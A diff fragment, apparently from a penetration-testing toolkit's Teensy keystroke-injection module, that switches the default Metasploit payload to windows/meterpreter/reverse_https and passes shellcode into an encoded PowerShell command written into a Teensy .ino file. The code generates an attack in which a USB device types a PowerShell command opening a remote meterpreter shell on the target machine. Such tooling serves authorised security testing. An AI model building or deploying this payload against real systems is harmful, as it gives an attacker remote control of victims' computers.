@@ -20,9 +20,9 @@ The powershell - shellcode injection leverages powershell to send a meterpreter 
 This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
 """)
 
-payload = input('Enter the payload name [or Enter for windows/meterpreter/reverse_http]: ')
+payload = input('Enter the payload name [or Enter for windows/meterpreter/reverse_https]: ')
 if payload == '':
-    payload = 'windows/meterpreter/reverse_http'
+    payload = 'windows/meterpreter/reverse_https'
 
 # create base metasploit payload to pass to powershell.prep
 with open(os.path.join(core.userconfigpath, "metasploit.payload"), 'w') as filewrite:
@@ -149,9 +149,9 @@ Keyboard.set_modifier(0);
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }
-""" % (core.powershell_encodedcommand()))
+""" % (core.powershell_encodedcommand(shellcode)))
 
-print("[*] Payload has been extracted. Copying file to root directory under reports/teensy.ino")
+print("[*] Payload has been extracted. Files can be found under /root/.set/reports/teensy.ino")
 
 if not os.path.isdir(os.path.join(core.userconfigpath, "reports")):
     os.makedirs(os.path.join(core.userconfigpath, "reports"))
